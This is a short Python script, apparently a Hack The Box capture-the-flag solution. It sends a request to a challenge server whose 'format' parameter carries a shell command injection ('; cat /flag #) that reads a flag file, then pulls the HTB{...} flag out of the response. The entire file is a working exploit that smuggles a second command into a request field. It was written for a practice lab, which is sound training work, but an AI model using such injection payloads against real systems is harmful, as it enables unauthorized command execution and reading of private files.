#!/usr/bin/env python3

url = "http://159.65.58.156:30237/"
import re

import requests

r = requests.get(url, params={"format": r"%H'; cat /flag #"})
print(re.findall(r"HTB{.*?}", r.text)[0])
